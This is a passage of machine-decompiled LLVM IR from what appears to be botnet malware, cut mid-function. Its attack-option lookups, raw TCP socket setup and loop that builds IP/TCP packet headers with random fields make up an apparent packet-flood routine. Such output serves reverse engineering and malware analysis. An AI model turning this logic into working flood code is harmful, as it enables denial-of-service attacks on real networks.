  %v0_bb40 = load i32, i32* @r5, align 4
  store i32 %v0_bb40, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bb3c, i32* %sb.global-to-local, align 4
  %v0_bb50 = load i32, i32* @r4, align 4
  store i32 %v0_bb50, i32* %r0.global-to-local, align 4
  %v4_bb54 = inttoptr i32 %v0_bb40 to i32*
  %v5_bb54 = call i32 @attack_get_opt_int(i32 %v0_bb50, i32* %v4_bb54, i32 4, i32 64)
  %v1_bb5c = urem i32 %v5_bb54, 256
  store i32 %v1_bb5c, i32* %ip.global-to-local, align 4
  %v0_bb60 = load i32, i32* @r5, align 4
  store i32 %v0_bb60, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb6c = load i32, i32* @r4, align 4
  store i32 %v0_bb6c, i32* %r0.global-to-local, align 4
  %v6_bb74 = inttoptr i32 %v0_bb60 to i32*
  %v7_bb74 = call i32 @attack_get_opt_int(i32 %v0_bb6c, i32* %v6_bb74, i32 5, i32 0)
  %v1_bb80 = urem i32 %v7_bb74, 256
  store i32 %v1_bb80, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r5, align 4
  store i32 %v0_bb8c, i32* %r1.global-to-local, align 4
  %v0_bb90 = load i32, i32* @r4, align 4
  store i32 %v0_bb90, i32* %r0.global-to-local, align 4
  %v5_bb98 = inttoptr i32 %v0_bb8c to i32*
  %v6_bb98 = call i32 @attack_get_opt_int(i32 %v0_bb90, i32* %v5_bb98, i32 6, i32 65535)
  %v0_bba0 = load i32, i32* @r5, align 4
  store i32 %v0_bba0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bb98, i32* @r6, align 4
  %v0_bbb0 = load i32, i32* @r4, align 4
  store i32 %v0_bbb0, i32* %r0.global-to-local, align 4
  %v4_bbb4 = inttoptr i32 %v0_bba0 to i32*
  %v5_bbb4 = call i32 @attack_get_opt_int(i32 %v0_bbb0, i32* %v4_bbb4, i32 7, i32 65535)
  %v0_bbbc = load i32, i32* @r5, align 4
  store i32 %v0_bbbc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_bbb4, i32* @sl, align 4
  %v0_bbcc = load i32, i32* @r4, align 4
  store i32 %v0_bbcc, i32* %r0.global-to-local, align 4
  %v4_bbd0 = inttoptr i32 %v0_bbbc to i32*
  %v5_bbd0 = call i32 @attack_get_opt_int(i32 %v0_bbcc, i32* %v4_bbd0, i32 17, i32 65535)
  %v0_bbdc = load i32, i32* @r5, align 4
  store i32 %v0_bbdc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_bbe8 = load i32, i32* @r4, align 4
  store i32 %v0_bbe8, i32* %r0.global-to-local, align 4
  %v5_bbec = inttoptr i32 %v0_bbdc to i32*
  %v6_bbec = call i32 @attack_get_opt_int(i32 %v0_bbe8, i32* %v5_bbec, i32 18, i32 65535)
  %v0_bbf0 = load i32, i32* @r5, align 4
  store i32 %v0_bbf0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc00 = load i32, i32* @r4, align 4
  store i32 %v0_bc00, i32* %r0.global-to-local, align 4
  %v5_bc04 = inttoptr i32 %v0_bbf0 to i32*
  %v6_bc04 = call i32 @attack_get_opt_int(i32 %v0_bc00, i32* %v5_bc04, i32 11, i32 0)
  %v0_bc08 = load i32, i32* @r5, align 4
  store i32 %v0_bc08, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bc18 = load i32, i32* @r4, align 4
  store i32 %v0_bc18, i32* %r0.global-to-local, align 4
  %v5_bc1c = inttoptr i32 %v0_bc08 to i32*
  %v6_bc1c = call i32 @attack_get_opt_int(i32 %v0_bc18, i32* %v5_bc1c, i32 12, i32 1)
  %v0_bc20 = load i32, i32* @r5, align 4
  store i32 %v0_bc20, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc30 = load i32, i32* @r4, align 4
  store i32 %v0_bc30, i32* %r0.global-to-local, align 4
  %v5_bc34 = inttoptr i32 %v0_bc20 to i32*
  %v6_bc34 = call i32 @attack_get_opt_int(i32 %v0_bc30, i32* %v5_bc34, i32 13, i32 0)
  %v0_bc38 = load i32, i32* @r5, align 4
  store i32 %v0_bc38, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc48 = load i32, i32* @r4, align 4
  store i32 %v0_bc48, i32* %r0.global-to-local, align 4
  %v5_bc4c = inttoptr i32 %v0_bc38 to i32*
  %v6_bc4c = call i32 @attack_get_opt_int(i32 %v0_bc48, i32* %v5_bc4c, i32 14, i32 0)
  %v0_bc50 = load i32, i32* @r5, align 4
  store i32 %v0_bc50, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r4, align 4
  store i32 %v0_bc60, i32* %r0.global-to-local, align 4
  %v5_bc64 = inttoptr i32 %v0_bc50 to i32*
  %v6_bc64 = call i32 @attack_get_opt_int(i32 %v0_bc60, i32* %v5_bc64, i32 15, i32 0)
  %v0_bc68 = load i32, i32* @r5, align 4
  store i32 %v0_bc68, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc78 = load i32, i32* @r4, align 4
  store i32 %v0_bc78, i32* %r0.global-to-local, align 4
  %v5_bc7c = inttoptr i32 %v0_bc68 to i32*
  %v6_bc7c = call i32 @attack_get_opt_int(i32 %v0_bc78, i32* %v5_bc7c, i32 16, i32 0)
  %v0_bc80 = load i32, i32* @r5, align 4
  store i32 %v0_bc80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_bc90 = load i32, i32* @r4, align 4
  store i32 %v0_bc90, i32* %r0.global-to-local, align 4
  %v5_bc94 = inttoptr i32 %v0_bc80 to i32*
  %v6_bc94 = call i32 @attack_get_opt_int(i32 %v0_bc90, i32* %v5_bc94, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bca4 = load i32, i32* @r5, align 4
  store i32 %v0_bca4, i32* %r1.global-to-local, align 4
  %v0_bca8 = load i32, i32* @r4, align 4
  store i32 %v0_bca8, i32* %r0.global-to-local, align 4
  %v4_bcac = inttoptr i32 %v0_bca4 to i32*
  %v5_bcac = call i32 @attack_get_opt_int(i32 %v0_bca8, i32* %v4_bcac, i32 1, i32 1)
  %v2_bcb8 = load i32, i32* @global_var_243d4.57, align 4
  store i32 %v2_bcb8, i32* %r3.global-to-local, align 4
  %v1_bcbc = urem i32 %v5_bcac, 256
  store i32 %v1_bcbc, i32* %ip.global-to-local, align 4
  %v0_bcc0 = load i32, i32* @r5, align 4
  store i32 %v0_bcc0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bcc8 = load i32, i32* @r4, align 4
  store i32 %v0_bcc8, i32* %r0.global-to-local, align 4
  %v5_bcd0 = inttoptr i32 %v0_bcc0 to i32*
  %v6_bcd0 = call i32 @attack_get_opt_ip(i32 %v0_bcc8, i32* %v5_bcd0, i32 25, i32 %v2_bcb8, i32 %v1_bcbc)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_bce4 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v7_bce8 = icmp eq i32 %v3_bce4, -1
  store i1 %v7_bce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bce8, label %dec_label_pc_c1b0, label %dec_label_pc_bcf4

dec_label_pc_bcf4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bcfc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bcfc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bd10 = call i32 @__GI_setsockopt(i32 %v3_bce4, i32 0, i32 3, i32 %v6_bcfc, i32 4)
  store i32 %v5_bd10, i32* %r0.global-to-local, align 4
  %v7_bd14 = icmp eq i32 %v5_bd10, -1
  store i1 %v7_bd14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bd14, label %dec_label_pc_c1a8, label %dec_label_pc_bd1c

dec_label_pc_bd1c:                                ; preds = %dec_label_pc_bcf4
  %v0_bd1c = load i32, i32* %sb.global-to-local, align 4
  %v3_bd1c = mul i32 %v0_bd1c, 65536
  store i32 %v3_bd1c, i32* @r5, align 4
  %v0_bd20 = load i32, i32* @r6, align 4
  %v0_bd24 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_bd2c = urem i32 %v0_bd1c, 65536
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  %v3_bd30 = urem i32 %v0_bd20, 65536
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v3_bd34 = urem i32 %v0_bd24, 65536
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v0_bd38 = load i32, i32* @r7, align 4
  %v2_bd38 = icmp eq i32 %v0_bd38, 0
  store i1 %v2_bd38, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bd38, label %dec_label_pc_c1bc, label %dec_label_pc_bd50

dec_label_pc_bd50:                                ; preds = %dec_label_pc_bd1c
  %v3_bd54 = mul i32 %v6_bc94, 65536
  %v1_bd58 = add i32 %v3_bd54, 2621440
  store i32 %v1_bd58, i32* @lr, align 4
  %tmp59 = mul i32 %v0_bd20, 256
  %v3_bd7c = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_bd24, 256
  %v3_bd80 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_bd20, 256
  %v4_bd84 = urem i32 %tmp61, 256
  %v5_bd84 = or i32 %v4_bd84, %v3_bd7c
  store i32 %v5_bd84, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_bd24, 256
  %v4_bd88 = urem i32 %tmp62, 256
  %v5_bd88 = or i32 %v4_bd88, %v3_bd80
  store i32 %v5_bd88, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_bd58, 256
  %v3_bd9c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_bd1c, 256
  %v3_bda0 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v5_bbd0, 256
  %v3_bda4 = and i32 %tmp65, 65280
  %v1_bda8 = urem i32 %v6_bc04, 2
  %v1_bdac = urem i32 %v6_bc1c, 2
  %tmp66 = udiv i32 %v5_bbd0, 256
  %v4_bdb0 = urem i32 %tmp66, 256
  %v5_bdb0 = or i32 %v4_bdb0, %v3_bda4
  %v4_bdb4 = udiv i32 %v1_bd58, 16777216
  %v5_bdb4 = or i32 %v3_bd9c, %v4_bdb4
  store i32 %v5_bdb4, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_bd1c, 256
  %v4_bdb8 = urem i32 %tmp67, 256
  %v5_bdb8 = or i32 %v4_bdb8, %v3_bda0
  store i32 %v5_bdb8, i32* @fp, align 4
  %v1_bdd4 = urem i32 %v6_bc34, 2
  store i32 %v1_bdd4, i32* %r2.global-to-local, align 4
  %v1_bdd8 = urem i32 %v6_bc4c, 2
  store i32 %v1_bdd8, i32* %r3.global-to-local, align 4
  %v1_bddc = urem i32 %v6_bc64, 2
  store i32 %v1_bddc, i32* %ip.global-to-local, align 4
  %v1_bde0 = urem i32 %v6_bc7c, 2
  store i32 %v1_bde0, i32* %r0.global-to-local, align 4
  %v1_bde4 = urem i32 %v6_bc34, 256
  store i32 %v1_bde4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_bb18, 16777216
  %v4_be58 = sdiv i32 %sext, 16777216
  %sext3 = mul i32 %v5_bb54, 16777216
  %v4_be64 = sdiv i32 %sext3, 16777216
  %tmp = sub nsw i32 0, %v1_bdac
  %v4_bed0 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_bdd4
  %v4_beec = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_bdd8
  %v4_bf00 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_bddc
  %v3_bf14 = and i32 %tmp74, 2
  %v2_bf38 = icmp eq i32 %v1_bde4, 0
  %v1_be60 = trunc i32 %v4_be58 to i8
  %extract.t = trunc i32 %v4_be64 to i8
  br label %dec_label_pc_be04

dec_label_pc_be04:                                ; preds = %bb70, %dec_label_pc_bd50
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_be10 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_be10, i32* %r0.global-to-local, align 4
  %v2_be18 = load i32, i32* @r4, align 4
  %v5_be18 = mul i32 %v2_be18, 4
  %v6_be18 = add i32 %v5_be18, %v2_bb00
  %v7_be18 = inttoptr i32 %v6_be18 to i32*
  store i32 %v2_be10, i32* %v7_be18, align 4
  %v3_be1c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_be1c, i32* %r2.global-to-local, align 4
  %v5_be24 = mul i32 %v3_be1c, 24
  %v1_be28 = load i32, i32* @r8, align 4
  %v2_be28 = add i32 %v1_be28, %v5_be24
  store i32 %v2_be28, i32* %r1.global-to-local, align 4
  store i32 %v2_bb00, i32* %r3.global-to-local, align 4
  %v4_be30 = mul i32 %v3_be1c, 4
  %v5_be30 = add i32 %v4_be30, %v2_bb00
  %v6_be30 = inttoptr i32 %v5_be30 to i32*
  %v7_be30 = load i32, i32* %v6_be30, align 4
  store i32 %v7_be30, i32* @r5, align 4
  %v1_be34 = inttoptr i32 %v7_be30 to i8*
  %v2_be34 = load i8, i8* %v1_be34, align 1
  %tmp75 = urem i8 %v2_be34, 16
  %v1_be38 = zext i8 %tmp75 to i32
  %v1_be3c = or i32 %v1_be38, 64
  store i32 %v1_be3c, i32* %r3.global-to-local, align 4
  %v1_be40 = trunc i32 %v1_be3c to i8
  store i8 %v1_be40, i8* %v1_be34, align 1
  %v0_be44 = load i32, i32* @r5, align 4
  %v1_be44 = inttoptr i32 %v0_be44 to i8*
  %v2_be44 = load i8, i8* %v1_be44, align 1
  %v1_be48 = and i8 %v2_be44, -16
  %v1_be4c = or i8 %v1_be48, 5
  store i32 %v1_bb80, i32* %ip.global-to-local, align 4
  store i8 %v1_be4c, i8* %v1_be44, align 1
  store i32 %v4_be58, i32* %r0.global-to-local, align 4
  %v0_be5c = load i32, i32* %ip.global-to-local, align 4
  %v2_be5c = icmp eq i32 %v0_be5c, 0
  store i1 %v2_be5c, i1* %cpsr_z.global-to-local, align 1
  %v2_be60 = load i32, i32* @r5, align 4
  %v3_be60 = add i32 %v2_be60, 1
  %v4_be60 = inttoptr i32 %v3_be60 to i8*
  store i8 %v1_be60, i8* %v4_be60, align 1
  store i32 %v4_be64, i32* %r2.global-to-local, align 4
  %v0_be68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_be68, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_be04
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_be6c = load i32, i32* @r5, align 4
  %v4_be6c = add i32 %v3_be6c, 6
  %v5_be6c = inttoptr i32 %v4_be6c to i16*
  store i16 64, i16* %v5_be6c, align 2
  %v0_be74.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_be74.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_be04, %bb
  %v0_be74.off0 = phi i8 [ %extract.t, %dec_label_pc_be04 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_be74 = load i32, i32* @r5, align 4
  %v3_be74 = add i32 %v2_be74, 8
  %v4_be74 = inttoptr i32 %v3_be74 to i8*
  store i8 %v0_be74.off0, i8* %v4_be74, align 1
  %v0_be78 = load i32, i32* %r3.global-to-local, align 4
  %v1_be78 = trunc i32 %v0_be78 to i8
  %v2_be78 = load i32, i32* @r5, align 4
  %v3_be78 = add i32 %v2_be78, 9
  %v4_be78 = inttoptr i32 %v3_be78 to i8*
  store i8 %v1_be78, i8* %v4_be78, align 1
  store i32 %v6_bcd0, i32* %ip.global-to-local, align 4
  %v1_be80 = load i32, i32* @r5, align 4
  %v2_be80 = add i32 %v1_be80, 12
  %v3_be80 = inttoptr i32 %v2_be80 to i32*
  store i32 %v6_bcd0, i32* %v3_be80, align 4
  %v0_be84 = load i32, i32* %r1.global-to-local, align 4
  %v1_be84 = add i32 %v0_be84, 16
  %v2_be84 = inttoptr i32 %v1_be84 to i32*
  %v3_be84 = load i32, i32* %v2_be84, align 4
  store i32 %v3_be84, i32* %r3.global-to-local, align 4
  %v0_be88 = load i32, i32* @sb, align 4
  %v1_be88 = trunc i32 %v0_be88 to i16
  %v2_be88 = load i32, i32* @r5, align 4
  %v3_be88 = add i32 %v2_be88, 2
  %v4_be88 = inttoptr i32 %v3_be88 to i16*
  store i16 %v1_be88, i16* %v4_be88, align 2
  %v0_be8c = load i32, i32* @fp, align 4
  %v1_be8c = trunc i32 %v0_be8c to i16
  %v2_be8c = load i32, i32* @r5, align 4
  %v3_be8c = add i32 %v2_be8c, 4
  %v4_be8c = inttoptr i32 %v3_be8c to i16*
  store i16 %v1_be8c, i16* %v4_be8c, align 2
  %v0_be90 = load i32, i32* %r3.global-to-local, align 4
  %v1_be90 = load i32, i32* @r5, align 4
  %v2_be90 = add i32 %v1_be90, 16
  %v3_be90 = inttoptr i32 %v2_be90 to i32*
  store i32 %v0_be90, i32* %v3_be90, align 4
  %v0_be94 = load i32, i32* @r6, align 4
  %v1_be94 = trunc i32 %v0_be94 to i16
  %v2_be94 = load i32, i32* @r5, align 4
  %v3_be94 = add i32 %v2_be94, 20
  %v4_be94 = inttoptr i32 %v3_be94 to i16*
  store i16 %v1_be94, i16* %v4_be94, align 2
  %v0_be98 = load i32, i32* @r5, align 4
  %v1_be98 = add i32 %v0_be98, 20
  store i32 %v1_be98, i32* @r4, align 4
  %v1_be9c = add i32 %v0_be98, 32
  %v2_be9c = inttoptr i32 %v1_be9c to i8*
  %v3_be9c = load i8, i8* %v2_be9c, align 1
  %v4_be9c = zext i8 %v3_be9c to i32
  store i32 %v4_be9c, i32* %r3.global-to-local, align 4
  %v1_bea0 = add i32 %v0_be98, 33
  %v2_bea0 = inttoptr i32 %v1_bea0 to i8*
  %v3_bea0 = load i8, i8* %v2_bea0, align 1
  %v4_bea0 = zext i8 %v3_bea0 to i32
  store i32 %v1_bda8, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_be9c, 16
  %v1_bea8 = zext i8 %tmp76 to i32
  %v1_beac = or i32 %v1_bea8, 80
  store i32 %v1_beac, i32* %r3.global-to-local, align 4
  %v1_beb0 = and i32 %v4_bea0, 223
  store i32 %v1_beb0, i32* %r2.global-to-local, align 4
  %v1_beb4 = trunc i32 %v1_beac to i8
  store i8 %v1_beb4, i8* %v2_be9c, align 1
  %v0_beb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_beb8 = load i32, i32* %r0.global-to-local, align 4
  %v4_beb8 = mul i32 %v1_beb8, 32
  %v5_beb8 = or i32 %v4_beb8, %v0_beb8
  store i32 %v5_beb8, i32* %r2.global-to-local, align 4
  store i32 %v5_bdb0, i32* %r1.global-to-local, align 4
  %v1_bec0 = trunc i32 %v5_beb8 to i8
  %v2_bec0 = load i32, i32* @r4, align 4
  %v3_bec0 = add i32 %v2_bec0, 13
  %v4_bec0 = inttoptr i32 %v3_bec0 to i8*
  store i8 %v1_bec0, i8* %v4_bec0, align 1
  %v0_bec4 = load i32, i32* @r4, align 4
  %v1_bec4 = add i32 %v0_bec4, 13
  %v2_bec4 = inttoptr i32 %v1_bec4 to i8*
  %v3_bec4 = load i8, i8* %v2_bec4, align 1
  %v4_bec4 = zext i8 %v3_bec4 to i32
  store i32 %v1_bdac, i32* %r2.global-to-local, align 4
  %v1_becc = and i32 %v4_bec4, 239
  %v5_bed0 = or i32 %v1_becc, %v4_bed0
  store i32 %v5_bed0, i32* %r3.global-to-local, align 4
  %v0_bed4 = load i32, i32* %r1.global-to-local, align 4
  %v2_bed4 = add i32 %v0_bec4, 4
  %v3_bed4 = inttoptr i32 %v2_bed4 to i32*
  store i32 %v0_bed4, i32* %v3_bed4, align 4
  %v0_bed8 = load i32, i32* @sl, align 4
  %v1_bed8 = trunc i32 %v0_bed8 to i16
  %v2_bed8 = load i32, i32* @r4, align 4
  %v3_bed8 = add i32 %v2_bed8, 2
  %v4_bed8 = inttoptr i32 %v3_bed8 to i16*
  store i16 %v1_bed8, i16* %v4_bed8, align 2
  %v0_bedc = load i32, i32* %r3.global-to-local, align 4
  %v1_bedc = trunc i32 %v0_bedc to i8
  %v2_bedc = load i32, i32* @r4, align 4
  %v3_bedc = add i32 %v2_bedc, 13
  %v4_bedc = inttoptr i32 %v3_bedc to i8*
  store i8 %v1_bedc, i8* %v4_bedc, align 1
  %v0_bee0 = load i32, i32* @r4, align 4
  %v1_bee0 = add i32 %v0_bee0, 13
  %v2_bee0 = inttoptr i32 %v1_bee0 to i8*
  %v3_bee0 = load i8, i8* %v2_bee0, align 1
  %v4_bee0 = zext i8 %v3_bee0 to i32
  store i32 %v1_bdd4, i32* %r3.global-to-local, align 4
  %v1_bee8 = and i32 %v4_bee0, 247
  %v5_beec = or i32 %v1_bee8, %v4_beec
  store i32 %v5_beec, i32* %r2.global-to-local, align 4
  %v1_bef0 = trunc i32 %v5_beec to i8
  store i8 %v1_bef0, i8* %v2_bee0, align 1
  %v0_bef4 = load i32, i32* @r4, align 4
  %v1_bef4 = add i32 %v0_bef4, 13
  %v2_bef4 = inttoptr i32 %v1_bef4 to i8*
  %v3_bef4 = load i8, i8* %v2_bef4, align 1
  %v4_bef4 = zext i8 %v3_bef4 to i32
  store i32 %v1_bdd8, i32* %ip.global-to-local, align 4
  %v1_befc = and i32 %v4_bef4, 251
  %v5_bf00 = or i32 %v1_befc, %v4_bf00
  store i32 %v5_bf00, i32* %r3.global-to-local, align 4
  %v1_bf04 = trunc i32 %v5_bf00 to i8
  store i8 %v1_bf04, i8* %v2_bef4, align 1
  %v0_bf08 = load i32, i32* @r4, align 4
  %v1_bf08 = add i32 %v0_bf08, 13
  %v2_bf08 = inttoptr i32 %v1_bf08 to i8*
  %v3_bf08 = load i8, i8* %v2_bf08, align 1
  %v4_bf08 = zext i8 %v3_bf08 to i32
  store i32 %v1_bddc, i32* %r0.global-to-local, align 4
  %v1_bf10 = and i32 %v4_bf08, 253
  %v4_bf14 = or i32 %v1_bf10, %v3_bf14
  store i32 %v4_bf14, i32* %r2.global-to-local, align 4
  %v1_bf18 = trunc i32 %v4_bf14 to i8
  store i8 %v1_bf18, i8* %v2_bf08, align 1
  %v0_bf1c = load i32, i32* @r4, align 4
  %v1_bf1c = add i32 %v0_bf1c, 13
  %v2_bf1c = inttoptr i32 %v1_bf1c to i8*
  %v3_bf1c = load i8, i8* %v2_bf1c, align 1
  %v4_bf1c = zext i8 %v3_bf1c to i32
  store i32 %v1_bde0, i32* %r1.global-to-local, align 4
  %v1_bf24 = and i32 %v4_bf1c, 254
  %v2_bf28 = or i32 %v1_bf24, %v1_bde0
  store i32 %v2_bf28, i32* %r3.global-to-local, align 4
  %v1_bf2c = trunc i32 %v2_bf28 to i8
  store i8 %v1_bf2c, i8* %v2_bf1c, align 1
  %v0_bf30 = call i32 @rand_next()
  %v1_bf30 = trunc i32 %v0_bf30 to i16
  store i32 %v0_bf30, i32* %r0.global-to-local, align 4
  store i32 %v1_bde4, i32* %r2.global-to-local, align 4
  store i1 %v2_bf38, i1* %cpsr_z.global-to-local, align 1
  %v3_bf44.pre = load i32, i32* @r4, align 4
  br i1 %v2_bf38, label %.thread4, label %bb68

bb68:                                             ; preds = %.thread
  %v2_bf3c = add i32 %v3_bf44.pre, 13
  %v3_bf3c = inttoptr i32 %v2_bf3c to i8*
  %v4_bf3c = load i8, i8* %v3_bf3c, align 1
  %v5_bf3c = zext i8 %v4_bf3c to i32
  %v2_bf40 = or i32 %v5_bf3c, 8
  store i32 %v2_bf40, i32* @r3, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread, %bb68
  %v4_bf44 = add i32 %v3_bf44.pre, 14
  %v5_bf44 = inttoptr i32 %v4_bf44 to i16*
  store i16 %v1_bf30, i16* %v5_bf44, align 2
  store i32 %v6_bc94, i32* %r1.global-to-local, align 4
  %v0_bf4c = load i32, i32* @r5, align 4
  %v1_bf4c = add i32 %v0_bf4c, 40
  store i32 %v1_bf4c, i32* %r0.global-to-local, align 4
  br i1 %v2_bf38, label %bb70, label %bb69

bb69:                                             ; preds = %.thread4
  %v1_bf50 = load i32, i32* @r3, align 4
  %v2_bf50 = trunc i32 %v1_bf50 to i8
  %v3_bf50 = load i32, i32* @r4, align 4
  %v4_bf50 = add i32 %v3_bf50, 13
  %v5_bf50 = inttoptr i32 %v4_bf50 to i8*
  store i8 %v2_bf50, i8* %v5_bf50, align 1
  br label %bb70

bb70:                                             ; preds = %.thread4, %bb69
  %v2_bf54 = inttoptr i32 %v1_bf4c to i16*
  %v3_bf54 = call i32 @rand_str(i16* %v2_bf54, i32 %v6_bc94)
  store i32 %v3_bf54, i32* %r0.global-to-local, align 4
  %v3_bf58 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf58, i32* %r3.global-to-local, align 4
  %v1_bf5c = add i32 %v3_bf58, 1
  store i32 %v1_bf5c, i32* @r4, align 4
  %v1_bf60 = load i32, i32* @r7, align 4
  %v9_bf60 = icmp eq i32 %v1_bf5c, %v1_bf60
  store i1 %v9_bf60, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bf5c, i32* %stack_var_-44, align 4
  %v5_bf68 = icmp slt i32 %v1_bf5c, %v1_bf60
  br i1 %v5_bf68, label %dec_label_pc_be04, label %dec_label_pc_bf6c

dec_label_pc_bf6c:                                ; preds = %bb70
  store i32 %v6_bc94, i32* %r3.global-to-local, align 4
  %v1_bf70 = add i32 %v6_bc94, 20
  store i32 %v1_bf70, i32* @sb, align 4
  br label %dec_label_pc_bf78

dec_label_pc_bf78:                                ; preds = %dec_label_pc_c1bc, %dec_label_pc_bf6c
  %v0_bf908 = phi i32 [ %v1_bf60, %dec_label_pc_bf6c ], [ 0, %dec_label_pc_c1bc ]
  %stack_var_-140.0 = phi i32 [ %v3_bd54, %dec_label_pc_bf6c ], [ %v3_c1c8, %dec_label_pc_c1bc ]
  %storemerge = add i32 %v6_bc94, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_bf7c = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_bf7c, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_bf7c, 256
  %v3_bf84 = and i32 %tmp71, 65280
  store i32 %v3_bf84, i32* %r3.global-to-local, align 4
  %v4_bf88 = udiv i32 %v1_bf7c, 16777216
  %v5_bf88 = or i32 %v3_bf84, %v4_bf88
  store i32 %v5_bf88, i32* @sl, align 4
  %v3_c128 = icmp eq i32 %v3_bd2c, 65535
  %v2_c18c = icmp eq i32 %v1_bcbc, 0
  %v2_bfc8 = icmp eq i32 %v6_bcd0, -1
  %v7_bfc8 = icmp eq i32 %v6_bcd0, -1
  br label %dec_label_pc_bf8c

dec_label_pc_bf8c:                                ; preds = %dec_label_pc_bf8c, %dec_label_pc_c0a4, %dec_label_pc_bf78
  %v0_bf90 = phi i32 [ %v0_bf908, %dec_label_pc_bf78 ], [ 0, %dec_label_pc_c0a4 ], [ 0, %dec_label_pc_bf8c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bf90 = icmp eq i32 %v0_bf90, 0
  store i1 %v2_bf90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bf90, label %dec_label_pc_bf8c, label %dec_label_pc_bf9c

dec_label_pc_bf9c:                                ; preds = %dec_label_pc_bf8c, %dec_label_pc_c0a4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bfa0

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_c020, %dec_label_pc_bf9c
  %v1_bfb4 = phi i32 [ %v1_c094, %dec_label_pc_c020 ], [ 0, %dec_label_pc_bf9c ]
  %v5_bfa4 = mul i32 %v1_bfb4, 24
  %v1_bfa8 = load i32, i32* @r8, align 4
  %v2_bfa8 = add i32 %v1_bfa8, %v5_bfa4
  store i32 %v2_bfa8, i32* %r3.global-to-local, align 4
  store i32 %v2_bb00, i32* %ip.global-to-local, align 4
  %v1_bfb0 = add i32 %v2_bfa8, 20
